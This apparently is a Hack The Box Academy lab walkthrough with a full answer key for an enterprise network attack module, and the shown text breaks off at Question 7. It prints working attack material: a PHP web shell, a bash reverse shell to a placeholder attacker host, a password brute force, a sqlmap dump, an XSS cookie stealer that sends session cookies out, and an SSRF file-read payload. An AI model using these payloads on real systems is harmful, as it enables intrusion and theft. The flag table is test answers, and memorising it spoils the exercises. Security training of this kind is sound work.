# Attacking Enterprise Networks Module


## Section Questions and their Answers

| Section                             | Question Number | Answer                                |
| ----------------------------------- | --------------- | ------------------------------------- |
| External Information Gathering      | Question 1      | 1337_HTB_DNS                          |
| External Information Gathering      | Question 2      | HTB{DNs_ZOn3_Tr@nsf3r}                |
| External Information Gathering      | Question 3      | flag.inlanefreight.local              |
| External Information Gathering      | Question 4      | monitoring                            |
| Service Enumeration & Exploitation  | Question 1      | HTB{0eb0ab788df18c3115ac43b1c06ae6c4} |
| Web Enumeration & Exploitation      | Question 1      | HTB{8f40ecf17f681612246fa5728c159e46} |
| Web Enumeration & Exploitation      | Question 2      | HTB{57c7f6d939eeda90aa1488b15617b9fa} |
| Web Enumeration & Exploitation      | Question 3      | HTB{e7134abea7438e937b87608eab0d979c} |
| Web Enumeration & Exploitation      | Question 4      | 1fbea4df249ac4f4881a5da387eb297cf     |
| Web Enumeration & Exploitation      | Question 5      | HTB{1nS3cuR3_c00k135}                 |
| Web Enumeration & Exploitation      | Question 6      | HTB{49f0bad299687c62334182178bfd75d8} |
| Web Enumeration & Exploitation      | Question 7      | HTB{32596e8376077c3ef8d5cf52f15279ba} |
| Web Enumeration & Exploitation      | Question 8      | HTB{dbca4dc5d99cdb3311404ea74921553c} |
| Web Enumeration & Exploitation      | Question 9      | HTB{bdd8a93aff53fd63a0a14de4eba4cbc1} |
| Initial Access                      | Question 1      | b447c27a00e3a348881b0030177000cd      |
| Post-Exploitation Persistence       | Question 1      | a34985b5976072c3c148abc751671302      |
| Internal Information Gathering      | Question 1      | bf22a1d0acfca4af517e1417a80e92d1      |
| Exploitation & Privilege Escalation | Question 1      | 0e20798f695ab0d04bc138b22344cea8      |
| Exploitation & Privilege Escalation | Question 2      | K33p_0n_sp00fing!                     |
| Lateral Movement                    | Question 1      | !qazXSW@                              |
| Lateral Movement                    | Question 2      | lucky7                                |
| Lateral Movement                    | Question 3      | 33a9d46de4015e7b3b0ad592a9394720      |
| Lateral Movement                    | Question 4      | 1squints2                             |
| Active Directory Compromise         | Question 1      | Repeat09                              |
| Active Directory Compromise         | Question 2      | 7c09eb1fff981654a3bb3b4a4e0d176a      |
| Active Directory Compromise         | Question 3      | fd1f7e5564060258ea787ddbb6e6afa2      |
| Post-Exploitation                   | Question 1      | 3c4996521690cc76446894da2bf7dd8f      |
| Post-Exploitation                   | Question 2      | 206c03861986c0e264438cb6e8e90a19      |

## Acronyms Used in Writeups

|Acronym|Meaning|
|---|---|
|STMIP|Spawned Target Machine IP Address|
|STMPO|Spawned Target Machine Port|
|PMVPN|Personal Machine with a Connection to the Academy's VPN|
|PWNIP|Pwnbox IP Address (or PMVPN IP Address)|
|PWNPO|Pwnbox Port (or PMVPN Port)|

# External Information Gathering

## Question 1

### "Perform a banner grab of the services listening on the target host and find a non-standard service banner. Submit the name as your answer (format: word_word_word)"

After spawning the target machine, students need to add the entry `STMIP inlanefreight.local` to the `/etc/hosts` file, as it will be needed for all of the questions for this section:

Code: shell

```shell
sudo sh -c 'echo "STMIP inlanefreight.local" >> /etc/hosts'
```

```shell-session
┌─[us-academy-1]─[10.10.14.129]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ sudo sh -c 'echo "10.129.197.76 inlanefreight.local" >> /etc/hosts'
```

Subsequently, students need to use `Nmap` to enumerate the services running on the target, finding the flag `1337_HTB_DNS` as the version of `BIND`:

Code: shell

```shell
sudo nmap -sC -sV inlanefreight.local
```

```shell-session
┌─[us-academy-1]─[10.10.14.129]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ sudo nmap -sC -sV inlanefreight.local

Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-10 09:27 BST
Nmap scan report for inlanefreight.local (10.129.197.76)
Host is up (0.10s latency).
Not shown: 989 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
<SNIP>
53/tcp   open  domain   (unknown banner: 1337_HTB_DNS)
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|     bind
|_    1337_HTB_DNS
| dns-nsid:
|_  bind.version: 1337_HTB_DNS

<SNIP>
```

Answer: `1337_HTB_DNS`

# External Information Gathering

## Question 2

### "Perform a DNS Zone Transfer against the target and find a flag. Submit the flag value as your answer (flag format: HTB{})"

(Students need to make sure that the `STMIP inlanefreight.local` entry is present in `/etc/hosts`, as done in Question 1.)

Students need to perform a DNS Zone Transfer using `dig` on the `inlanefreight.local` domain, to find the flag `HTB{DNs_ZOn3_Tr@nsf3r}` contained within the TXT record of the subdomain `flag.inlanefreight.local`:

Code: shell

```shell
dig AXFR inlanefreight.local @STMIP
```

```shell-session
┌─[us-academy-1]─[10.10.14.129]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ dig AXFR inlanefreight.local @10.129.197.76

; <<>> DiG 9.16.15-Debian <<>> axfr inlanefreight.local @10.129.197.76
;; global options: +cmd
inlanefreight.local.	86400	IN	SOA	ns1.inlanfreight.local. dnsadmin.inlanefreight.local. 21 604800 86400 2419200 86400
inlanefreight.local.	86400	IN	NS	inlanefreight.local.
inlanefreight.local.	86400	IN	A	127.0.0.1
blog.inlanefreight.local. 86400	IN	A	127.0.0.1
careers.inlanefreight.local. 86400 IN	A	127.0.0.1
dev.inlanefreight.local. 86400	IN	A	127.0.0.1
flag.inlanefreight.local. 86400	IN	TXT	"HTB{DNs_ZOn3_Tr@nsf3r}"
gitlab.inlanefreight.local. 86400 IN	A	127.0.0.1
ir.inlanefreight.local.	86400	IN	A	127.0.0.1
status.inlanefreight.local. 86400 IN	A	127.0.0.1
support.inlanefreight.local. 86400 IN	A	127.0.0.1
tracking.inlanefreight.local. 86400 IN	A	127.0.0.1
vpn.inlanefreight.local. 86400	IN	A	127.0.0.1
inlanefreight.local.	86400	IN	SOA	ns1.inlanfreight.local. dnsadmin.inlanefreight.local. 21 604800 86400 2419200 86400
;; Query time: 88 msec
;; SERVER: 10.129.197.76#53(10.129.197.76)
;; WHEN: Wed Aug 10 09:49:04 BST 2022
;; XFR size: 14 records (messages 1, bytes 448)
```

Answer: `HTB{DNs_ZOn3_Tr@nsf3r}`

# External Information Gathering

## Question 3

### "What is the FQDN of the associated subdomain?"

From the output of the Zone Transfer performed in the previous question, students will know that the FQDN of the associated subdomain is `flag.inlanefreight.local`:

Code: shell

```shell
dig AXFR inlanefreight.local @STMIP
```

```shell-session
┌─[us-academy-1]─[10.10.14.129]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ dig AXFR inlanefreight.local @10.129.197.76

; <<>> DiG 9.16.15-Debian <<>> axfr inlanefreight.local @10.129.197.76
;; global options: +cmd
inlanefreight.local.	86400	IN	SOA	ns1.inlanfreight.local. dnsadmin.inlanefreight.local. 21 604800 86400 2419200 86400
inlanefreight.local.	86400	IN	NS	inlanefreight.local.
inlanefreight.local.	86400	IN	A	127.0.0.1
blog.inlanefreight.local. 86400	IN	A	127.0.0.1
careers.inlanefreight.local. 86400 IN	A	127.0.0.1
dev.inlanefreight.local. 86400	IN	A	127.0.0.1
flag.inlanefreight.local. 86400	IN	TXT	"HTB{DNs_ZOn3_Tr@nsf3r}"
gitlab.inlanefreight.local. 86400 IN	A	127.0.0.1
ir.inlanefreight.local.	86400	IN	A	127.0.0.1
status.inlanefreight.local. 86400 IN	A	127.0.0.1
support.inlanefreight.local. 86400 IN	A	127.0.0.1
tracking.inlanefreight.local. 86400 IN	A	127.0.0.1
vpn.inlanefreight.local. 86400	IN	A	127.0.0.1
inlanefreight.local.	86400	IN	SOA	ns1.inlanfreight.local. dnsadmin.inlanefreight.local. 21 604800 86400 2419200 86400
;; Query time: 88 msec
;; SERVER: 10.129.197.76#53(10.129.197.76)
;; WHEN: Wed Aug 10 09:49:04 BST 2022
;; XFR size: 14 records (messages 1, bytes 448)
```

Answer: `flag.inlanefreight.local`

# External Information Gathering

## Question 4

### "Perform vhost discovery. What additional vhost exists?"

(Students need to make sure that the `STMIP inlanefreight.local` entry is present in `/etc/hosts`, as done in Question 1.)

A plethora of tools exist that students can utilize to perform VHost bruteforcing, including `ffuf` and `gobuster`; the former will be used. Students first need to determine the size of the response when requesting a non-existent VHost using `cURL`, finding it to be `15157`:

Code: shell

```shell
curl -s -I http://STMIP -H "Host: defnotvalid.inlanefreight.local" | grep "Content-Length:"
```

```shell-session
┌─[us-academy-1]─[10.10.14.27]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ curl -sI http://10.129.203.114/ -H "Host: defnotvalid.inlanefreight.local" | grep "Content-Length:"

Content-Length: 15157
```

Thereafter, students need to filter it out using the `-fs` option of `ffuf`; the additional VHost that exists is `monitoring`:

Code: shell

```shell
ffuf -w /opt/useful/SecLists/Discovery/DNS/namelist.txt:FUZZ -u http://STMIP/ -H 'Host:FUZZ.inlanefreight.local'
```

```shell-session
┌─[us-academy-1]─[10.10.14.27]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ ffuf -s -w /opt/useful/SecLists/Discovery/DNS/namelist.txt:FUZZ -u http://10.129.203.114/ -H 'Host: FUZZ.inlanefreight.local' -fs 15157

blog
careers
dev
ir
monitoring
support
vpn
```

Answer: `monitoring`

# Service Enumeration & Exploitation

## Question 1

### "Enumerate the accessible services and find a flag. Submit the flag value as your answer (flag format: HTB{})"

Students need to connect to the FTP server on the spawned target machine with `ftp` using anonymous login (i.e., utilizing the credentials `anonymous:anonymous`, or any arbitrary string for the password):

Code: shell

```shell
ftp STMIP
```

```shell-session
┌─[us-academy-1]─[10.10.14.27]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ ftp 10.129.203.114

Connected to 10.129.203.114.
220 (vsFTPd 3.0.3)
Name (10.129.203.114:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```

Subsequently, students need to download the flag file "flag.txt" using `get` then print its contents out, to attain `HTB{0eb0ab788df18c3115ac43b1c06ae6c4}`:

Code: shell

```shell
get flag.txt
!cat flag.txt
```

```shell-session
ftp> get flag.txt

local: flag.txt remote: flag.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for flag.txt (38 bytes).
226 Transfer complete.
38 bytes received in 0.00 secs (8.5486 kB/s)
ftp> !cat flag.txt

HTB{0eb0ab788df18c3115ac43b1c06ae6c4}
```

Answer: `HTB{0eb0ab788df18c3115ac43b1c06ae6c4}`

# Web Enumeration & Exploitation

## Question 1

### "Use the IDOR vulnerability to find a flag. Submit the flag value as your answer (flag format: HTB{})."

After spawning the target machine, students need to add the entry `STMIP careers.inlanefreight.local` into `/etc/hosts`:

Code: shell

```shell
sudo sh -c 'echo "STMIP careers.inlanefreight.local" >> /etc/hosts'
```

```shell-session
┌─[us-academy-1]─[10.10.14.27]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ sudo sh -c 'echo "10.129.203.114 careers.inlanefreight.local" >> /etc/hosts'
```

Subsequently, students need to navigate to `http://careers.inlanefreight.local/register` using the browser and register a new account:

![Attacking_Enterprise_Networks_Walkthrough_Image_1.png](https://academy.hackthebox.com/storage/walkthroughs/41/Attacking_Enterprise_Networks_Walkthrough_Image_1.png)

Then, students need to login with the account that they registered (or, alternatively, students can use the account that was mentioned in the module's section `pentester:Str0ngP@ssw0rd!`):

![Attacking_Enterprise_Networks_Walkthrough_Image_2.png](https://academy.hackthebox.com/storage/walkthroughs/41/Attacking_Enterprise_Networks_Walkthrough_Image_2.png)

Students then need to fuzz the different user accounts that can be fetched by altering the URL parameter `id`, and since the registered user has an `id` value of 9, students should try lower values. Students will find the flag `HTB{8f40ecf17f681612246fa5728c159e46}` within the `id` of value 4:

![Attacking_Enterprise_Networks_Walkthrough_Image_3.png](https://academy.hackthebox.com/storage/walkthroughs/41/Attacking_Enterprise_Networks_Walkthrough_Image_3.png)

Answer: `HTB{8f40ecf17f681612246fa5728c159e46}`

# Web Enumeration & Exploitation

## Question 2

### "Exploit the HTTP verb tampering vulnerability to find a flag. Submit the flag value as your answer (flag format: HTB{})."

After spawning the target machine, students need to add the entry "`STMIP dev.inlanefreight.local` into `/etc/hosts`:

Code: shell

```shell
sudo sh -c 'echo "STMIP dev.inlanefreight.local" >> /etc/hosts'
```

```shell-session
┌─[us-academy-1]─[10.10.14.27]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ sudo sh -c 'echo "10.129.203.114 dev.inlanefreight.local" >> /etc/hosts'
```

Subsequently, students need to make sure that `FoxyProxy` is set to the pre-configured proxy "BURP" in the browser, open `Burp Suite`, and then use the browser to navigate to `http://dev.inlanefreight.local/upload.php`:

![Attacking_Enterprise_Networks_Walkthrough_Image_4.png](https://academy.hackthebox.com/storage/walkthroughs/41/Attacking_Enterprise_Networks_Walkthrough_Image_4.png)

Afterward, students need to send the intercepted request to `Repeater` (`Ctrl` + `R`), change the request method from `GET` to `TRACK`, and add/inject the header `X-Custom-IP-Authorization` with `127.0.0.1` as its value after the `Accept-Language` header, then click on "Send":

![Attacking_Enterprise_Networks_Walkthrough_Image_5.png](https://academy.hackthebox.com/storage/walkthroughs/41/Attacking_Enterprise_Networks_Walkthrough_Image_5.png)

Looking at the response from the request, students will notice that it is a file upload form, thus, they need to right-click and click on `Show response in browser`:

![Attacking_Enterprise_Networks_Walkthrough_Image_6.png](https://academy.hackthebox.com/storage/walkthroughs/41/Attacking_Enterprise_Networks_Walkthrough_Image_6.png)

Students then will receive a prompt with the required instructions, thus, they need to click on `Copy`, and paste the URL in the browser where FoxyProxy is set to use the pre-configured proxy "BURP":

![Attacking_Enterprise_Networks_Walkthrough_Image_7.png](https://academy.hackthebox.com/storage/walkthroughs/41/Attacking_Enterprise_Networks_Walkthrough_Image_7.png)

Once the "PIXEL SHOP" web page appears, students will notice that they can upload files after clicking the "Browse" button; thus, they need to create a basic PHP web shell and save it in a file:

Code: php

```php
<?php system($_GET['cmd']); ?>
```

```shell-session
┌─[us-academy-1]─[10.10.14.27]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ cat 9125309563421.php

<?php system($_GET['cmd']); ?>
```

Thereafter, students need to click on "Browse" to upload the web shell:

![Attacking_Enterprise_Networks_Walkthrough_Image_8.png](https://academy.hackthebox.com/storage/walkthroughs/41/Attacking_Enterprise_Networks_Walkthrough_Image_8.png)

Students need to make sure that they change the setting "All Supported Types" to "All Files", then select the PHP web shell:

![Attacking_Enterprise_Networks_Walkthrough_Image_9.png](https://academy.hackthebox.com/storage/walkthroughs/41/Attacking_Enterprise_Networks_Walkthrough_Image_9.png)

Subsequently, students need to click on `Submit` and intercept the request in `Burp Suite`, to then send it to `Repeater` (`Ctrl` + `R`):

![Attacking_Enterprise_Networks_Walkthrough_Image_10.png](https://academy.hackthebox.com/storage/walkthroughs/41/Attacking_Enterprise_Networks_Walkthrough_Image_10.png)

In `Repeater`, students need to change the `Content-Type` header that holds the value `application/x-php` to be instead `image/png`, then send the modified intercepted request:

![Attacking_Enterprise_Networks_Walkthrough_Image_11.png](https://academy.hackthebox.com/storage/walkthroughs/41/Attacking_Enterprise_Networks_Walkthrough_Image_11.png)

The response shows the students where the web shell was uploaded, thus, now they can either use the browser or `cURL` to search/enumerate for the flag within the target. The flag `HTB{57c7f6d939eeda90aa1488b15617b9fa}` within the file "flag.txt" is under the directory `/var/www/html/`:

Code: shell

```shell
curl -s http://dev.inlanefreight.local/uploads/9125309563421.php?cmd=cat /var/www/html/flag.txt
```

```shell-session
┌─[us-academy-1]─[10.10.14.27]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ curl -s "http://dev.inlanefreight.local/uploads/9125309563421.php?cmd=cat+/var/www/html/flag.txt"

HTB{57c7f6d939eeda90aa1488b15617b9fa}
```

Answer: `HTB{57c7f6d939eeda90aa1488b15617b9fa}`

# Web Enumeration & Exploitation

## Question 3

### "Exploit the WordPress instance and find a flag in the web root. Submit the flag value as your answer (flag format: HTB{})."

After spawning the target machine, students need to add the entry `STMIP ir.inlanefreight.local` into `/etc/hosts`:

Code: shell

```shell
sudo sh -c 'echo "STMIP ir.inlanefreight.local" >> /etc/hosts'
```

```shell-session
┌─[us-academy-1]─[10.10.14.27]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ sudo sh -c 'echo "10.129.203.114 ir.inlanefreight.local" >> /etc/hosts'
```

Subsequently, students need to perform an enumeration scan to check for available users using `Wpscan` on the `WordPress` instance, finding `ilfreightwp`, `john`, `tom`, and `james`:

Code: shell

```shell
wpscan --url http://ir.inlanefreight.local -e u -t 500 --no-banner
```

```shell-session
┌─[us-academy-1]─[10.10.14.27]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ wpscan --url http://ir.inlanefreight.local -e u -t 500 --no-banner

[+] URL: http://ir.inlanefreight.local/ [10.129.205.194]
[+] Started: Fri Aug 12 18:10:09 2022

<SNIP>

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:03 <=============================================> (10 / 10) 100.00% Time: 00:00:03

[i] User(s) Identified:

[+] ilfreightwp
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://ir.inlanefreight.local/wp-json/wp/v2/users/?per_page=100&page=1
 |  Rss Generator (Aggressive Detection)
 |  Author Sitemap (Aggressive Detection)
 |   - http://ir.inlanefreight.local/wp-sitemap-users-1.xml
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] john
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] tom
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] james
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
```

Afterward, students need to perform a password bruteforce attack against the user `ilfreightwp` using `Wpscan` (or any other tool, such as `Hydra`), specifying the SecLists wordlist `darkweb2017-top100.txt` to be used; `Wpscan` finds the password to be `password1`:

Code: shell

```shell
wpscan --url http://ir.inlanefreight.local -P /usr/share/SecLists/Passwords/darkweb2017-top100.txt -U ilfreightwp --no-banner -t 500
```

```shell-session
┌─[us-academy-1]─[10.10.14.27]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ wpscan --url http://ir.inlanefreight.local -P /usr/share/SecLists/Passwords/darkweb2017-top100.txt -U ilfreightwp --no-banner -t 500

[+] URL: http://ir.inlanefreight.local/ [10.129.205.194]
[+] Started: Fri Aug 12 18:16:09 2022

<SNIP>

[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - ilfreightwp / password1                                                                                        
Trying ilfreightwp / babygirl1 Time: 00:00:00 <=====================                     > (99 / 198) 50.00%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: ilfreightwp, Password: password1
```

Armed with the credentials `ilfreightwp:password1`, students need to navigate to `http://ir.inlanefreight.local/wp-login.php` and log in with them:

![Attacking_Enterprise_Networks_Walkthrough_Image_12.png](https://academy.hackthebox.com/storage/walkthroughs/41/Attacking_Enterprise_Networks_Walkthrough_Image_12.png)

Once logged in successfully, students need to navigate to the the Theme Editor:

![Attacking_Enterprise_Networks_Walkthrough_Image_13.png](https://academy.hackthebox.com/storage/walkthroughs/41/Attacking_Enterprise_Networks_Walkthrough_Image_13.png)

After clicking on "I understand", students need to select the "Twenty Twenty" theme:

![Attacking_Enterprise_Networks_Walkthrough_Image_14.png](https://academy.hackthebox.com/storage/walkthroughs/41/Attacking_Enterprise_Networks_Walkthrough_Image_14.png)

Once students select the theme and click on "Select", they need to select the "404 Template" (404.php):

![Attacking_Enterprise_Networks_Walkthrough_Image_15.png](https://academy.hackthebox.com/storage/walkthroughs/41/Attacking_Enterprise_Networks_Walkthrough_Image_15.png)

At the beginning of the file and after `<?php`, students need to add a PHP reverse shell and then update the file:

Code: php

```php
exec("/bin/bash -c 'bash -i > /dev/tcp/PWNIP/PWNPO 0>&1'");
```

![Attacking_Enterprise_Networks_Walkthrough_Image_16.png](https://academy.hackthebox.com/storage/walkthroughs/41/Attacking_Enterprise_Networks_Walkthrough_Image_16.png)

After updating the file successfully, students need to start an `nc` listener on the same port that was specified in the PHP reverse shell (`443` in this case):

Code: shell

```shell
sudo nc -nvlp PWNPO
```

```shell-session
┌─[us-academy-1]─[10.10.14.111]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ sudo nc -nvlp 443

Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
```

Afterward, students need to navigate to `http://ir.inlanefreight.local/wp-content/themes/twentytwenty/404.php` so that the PHP reverse shell code is executed:

![Attacking_Enterprise_Networks_Walkthrough_Image_17.png](https://academy.hackthebox.com/storage/walkthroughs/41/Attacking_Enterprise_Networks_Walkthrough_Image_17.png)

(Students can choose to upgrade the dumb TTY terminal to an interactive one.) Once the reverse shell is received, students need to enumerate the target for the flag file "flag.txt", finding it under the `/var/www/html/` directory, with its contents being `HTB{e7134abea7438e937b87608eab0d979c}`:

Code: shell

```shell
cat /var/www/html/flag.txt
```

```shell-session
cat /var/www/html/flag.txt

HTB{e7134abea7438e937b87608eab0d979c}
```

Answer: `HTB{e7134abea7438e937b87608eab0d979c}`

# Web Enumeration & Exploitation

## Question 4

### "Enumerate the "status" database and retrieve the password for the "Flag" user. Submit the value as your answer."

After spawning the target machine, students need to add the entry `STMIP status.inlanefreight.local` into `/etc/hosts`:

Code: shell

```shell
sudo sh -c 'echo "STMIP status.inlanefreight.local" >> /etc/hosts'
```

```shell-session
┌─[us-academy-1]─[10.10.14.27]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ sudo sh -c 'echo "10.129.203.114 status.inlanefreight.local" >> /etc/hosts'
```

Subsequently, students need to navigate to `http://status.inlanefreight.local` to find a form where they can search for logs. From there, students need to have FoxyProxy set on the pre-configured "BURP" proxy in FireFox, open `Burp Suite`, then enter any text within the input text-box and click on "Search!" :

![Attacking_Enterprise_Networks_Walkthrough_Image_18.png](https://academy.hackthebox.com/storage/walkthroughs/41/Attacking_Enterprise_Networks_Walkthrough_Image_18.png)

Students need to set the value of `searchitem` to be `*`, so that `sqlmap` knows where to inject. Thereafter, students need to right-click on the request and choose `Save item` to save the request:

![Attacking_Enterprise_Networks_Walkthrough_Image_19.png](https://academy.hackthebox.com/storage/walkthroughs/41/Attacking_Enterprise_Networks_Walkthrough_Image_19.png)

![Attacking_Enterprise_Networks_Walkthrough_Image_20.png](https://academy.hackthebox.com/storage/walkthroughs/41/Attacking_Enterprise_Networks_Walkthrough_Image_20.png)

Afterward, students need to run `sqlmap` using the saved request file and dump the data of the "users" table within the "status" database (which is all known from the section's reading) to attain the flag `1fbea4df249ac4f4881a5da387eb297cf` as the `password` value of `id` 2:

Code: shell

```shell
sqlmap -r Request.req --dbms=mysql --dump -D status -T users --batch
```

```shell-session
┌─[us-academy-1]─[10.10.14.12]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ sqlmap -r Request.req --dbms=mysql --dump -D status -T users --batch

		___
       __H__
 ___ ___[,]_____ ___ ___  {1.5.9#stable}
|_ -| . [,]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

<SNIP>

[13:19:36] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 20.04 or 19.10 (eoan or focal)
web application technology: Apache 2.4.41
back-end DBMS: MySQL >= 5.6
[13:19:37] [INFO] fetching columns for table 'users' in database 'status'
[13:19:37] [INFO] fetching entries for table 'users' in database 'status'
Database: status
Table: users
[2 entries]
+----+-----------------------------------+----------+
| id | password                          | username |
+----+-----------------------------------+----------+
| 1  | 4528342e54d6f8f8cf15bf6e3c31bf1f6 | Admin    |
| 2  | 1fbea4df249ac4f4881a5da387eb297cf | Flag     |
+----+-----------------------------------+----------+
```

Answer: `1fbea4df249ac4f4881a5da387eb297cf`

# Web Enumeration & Exploitation

## Question 5

### "Steal an admin's session cookie and gain access to the support ticketing queue. Submit the flag value for the "John" user as your answer."

After spawning the target machine, students need to add the entry `STMIP support.inlanefreight.local` into `/etc/hosts` file:

Code: shell

```shell
sudo sh -c 'echo "STMIP support.inlanefreight.local" >> /etc/hosts'
```

```shell-session
┌─[us-academy-1]─[10.10.14.27]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ sudo sh -c 'echo "10.129.203.114 support.inlanefreight.local" >> /etc/hosts'
```

Subsequently, students need to create two files on `Pwnbox`/`PMVPN`, "index.php" and "script.js"; the former will log and URL-decode the cookie from the HTTP request (and save it to a file), while the latter will redirect the request to the former:

Code: php

```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

Students need to make sure to replace `PWNIP` accordingly in the following JavaScript code:

Code: javascript

```javascript
new Image().src='http://PWNIP:PWNPO/index.php?c='+document.cookie
```

Afterward, students need to start a PHP web server, using the same port number that was specified in the "script.js" file for `PWNPO` (9200 in here):

Code: shell

```shell
php -S 0.0.0.0:PWNPO
```

```shell-session
┌─[us-academy-1]─[10.10.14.12]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ php -S 0.0.0.0:9200

[Sun Aug 14 15:09:51 2022] PHP 7.4.21 Development Server (http://0.0.0.0:9200) started
```

Then, students need to navigate to `http://support.inlanefreight.local/ticket.php` and click on "Raise Ticket":

![Attacking_Enterprise_Networks_Walkthrough_Image_21.png](https://academy.hackthebox.com/storage/walkthroughs/41/Attacking_Enterprise_Networks_Walkthrough_Image_21.png)

Students need to fill the "Raise Ticket" form with dummy data, except for the "Message field", in which an XSS payload will be supplied that redirects the viewer of the ticket to the "script.js" script/file served through the PHP server:

Code: javascript

```javascript
><script src=http://PWNIP:PWNPO/script.js></script>
```

![Attacking_Enterprise_Networks_Walkthrough_Image_22.png](https://academy.hackthebox.com/storage/walkthroughs/41/Attacking_Enterprise_Networks_Walkthrough_Image_22.png)

After clicking on "Send", students will notice that the PHP web server has grabbed the cookie `session=fcfaf93ab169bc943b92109f0a845d99` of the user that viewed the ticket:

![Attacking_Enterprise_Networks_Walkthrough_Image_23.png](https://academy.hackthebox.com/storage/walkthroughs/41/Attacking_Enterprise_Networks_Walkthrough_Image_23.png)

Thus, students need to add this cookie; by viewing the Storage tab under the Web Developer Tools (which can be opened in Firefox by pressing Ctrl + Shift + I), students will be able to create a new cookie named `session` with the value `fcfaf93ab169bc943b92109f0a845d99`:

![Attacking_Enterprise_Networks_Walkthrough_Image_24.png](https://academy.hackthebox.com/storage/walkthroughs/41/Attacking_Enterprise_Networks_Walkthrough_Image_24.png)

After adding the `session` cookie, students need to click on "Login", which will redirect them to a dashboard as the Admin account, where the flag `HTB{1nS3cuR3_c00k135}` will be the value of "Status" of "Ticket ID" `9818`:

![Attacking_Enterprise_Networks_Walkthrough_Image_25.png](https://academy.hackthebox.com/storage/walkthroughs/41/Attacking_Enterprise_Networks_Walkthrough_Image_25.png)

Answer: `HTB{1nS3cuR3_c00k135}`

# Web Enumeration & Exploitation

## Question 6

### "Use the SSRF to Local File Read vulnerability to find a flag. Submit the flag value as your answer (flag format: HTB{})."

After spawning the target machine, students need to add the entry `STMIP tracking.inlanefreight.local` into `/etc/hosts`:

Code: shell

```shell
sudo sh -c 'echo "STMIP tracking.inlanefreight.local" >> /etc/hosts'
```

```shell-session
┌─[us-academy-1]─[10.10.14.27]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ sudo sh -c 'echo "10.129.203.114 tracking.inlanefreight.local" >> /etc/hosts'
```

Subsequently, students need to navigate to `http://tracking.inlanefreight.local` and inject the "Track Now" field with a JavaScript payload that will trigger an SSRF to read a local file from the system, "flag.txt" in this case:

Code: javascript

```javascript
<script>
	x=new XMLHttpRequest;
	x.onload=function(){
	document.write(this.responseText)};
	x.open("GET","file:///flag.txt");
	x.send();
</script>
```

![Attacking_Enterprise_Networks_Walkthrough_Image_26.png](https://academy.hackthebox.com/storage/walkthroughs/41/Attacking_Enterprise_Networks_Walkthrough_Image_26.png)

After clicking on "Track Now", students will receive the contents of the flag file "flag.txt" in the generated PDF, which is `HTB{49f0bad299687c62334182178bfd75d8}`:

![Attacking_Enterprise_Networks_Walkthrough_Image_27.png](https://academy.hackthebox.com/storage/walkthroughs/41/Attacking_Enterprise_Networks_Walkthrough_Image_27.png)

Answer: `HTB{49f0bad299687c62334182178bfd75d8}`

# Web Enumeration & Exploitation

## Question 7

### "Register an account and log in to the Gitlab instance. Submit the flag value (flag format: HTB{})."

After spawning the target machine, students need to add the entry `STMIP gitlab.inlanefreight.local` into `/etc/hosts`:

Code: shell

```shell
sudo sh -c 'echo "STMIP gitlab.inlanefreight.local" >> /etc/hosts'
```

```shell-session
┌─[us-academy-1]─[10.10.14.27]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ sudo sh -c 'echo "10.129.203.114 gitlab.inlanefreight.local" >> /etc/hosts'
```

Subsequently, students need to navigate to `http://gitlab.inlanefreight.local` and register an account:

![Attacking_Enterprise_Networks_Walkthrough_Image_28.png](https://academy.hackthebox.com/storage/walkthroughs/41/Attacking_Enterprise_Networks_Walkthrough_Image_28.png)

![Attacking_Enterprise_Networks_Walkthrough_Image_29.png](https://academy.hackthebox.com/storage/walkthroughs/41/Attacking_Enterprise_Networks_Walkthrough_Image_29.png)

